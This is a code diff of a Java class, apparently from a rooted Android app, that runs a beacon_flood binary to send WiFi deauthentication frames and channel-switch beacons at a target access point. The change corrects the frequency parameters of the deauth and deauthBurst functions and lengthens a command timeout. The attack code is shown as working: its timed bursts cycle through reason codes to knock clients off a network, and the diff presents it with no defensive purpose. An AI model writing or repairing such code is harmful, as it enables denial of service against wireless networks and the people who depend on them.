@@ -30,20 +30,21 @@ public class MonitorManager {
      * Stays in monitor mode — no WiFi toggle needed.
      * Each call sends 10 deauth + 10 CSA beacons (~500ms).
      */
-    public void deauth(String apMac, String clientMac, int channel) {
+    public void deauth(String apMac, String clientMac, int freqMhz) {
         if (!monitorEnabled) return;
         // beacon_flood <iface> <bssid> <ssid> <apFreq> <ourFreq> <reason>
-        // We target broadcast deauth (CSA forces clients to scan)
+        // freqs are in MHz (NOT channel numbers!)
         int reason = 7; // Class 3 frame from nonassociated STA
         execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
-                     + " \"x\" " + channel + " " + channel + " " + reason + " 2>/dev/null");
+                     + " \"x\" " + freqMhz + " " + freqMhz + " " + reason + " 2>/dev/null");
     }
     
     /**
      * Deauth burst: rapid beacon_flood calls for durationSeconds.
      * Call interval ~600ms = ~16 calls per 10s = 160 deauth + 160 CSA beacons.
+     * @param freqMhz target AP frequency in MHz (e.g. 2437, NOT channel number!)
      */
-    public void deauthBurst(String apMac, int channel, int durationSeconds) {
+    public void deauthBurst(String apMac, int freqMhz, int durationSeconds) {
         if (!monitorEnabled) return;
         long end = System.currentTimeMillis() + durationSeconds * 1000L;
         final int[] REASONS = {1, 2, 3, 4, 6, 7};
@@ -51,7 +52,7 @@ public class MonitorManager {
         while (System.currentTimeMillis() < end) {
             int reason = REASONS[ri % REASONS.length];
             execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
-                         + " \"x\" " + channel + " " + channel + " " + reason + " 2>/dev/null");
+                         + " \"x\" " + freqMhz + " " + freqMhz + " " + reason + " 2>/dev/null");
             ri++;
             try { Thread.sleep(600); } catch (Exception e) {}
         }
@@ -244,7 +245,7 @@ public class MonitorManager {
             }, "exec-reader");
             reader.start();
             
-            try { reader.join(8000); } catch (Exception e) {}
+            try { reader.join(65000); } catch (Exception e) {}
             
             if (!done[0]) {
                 p.destroy();
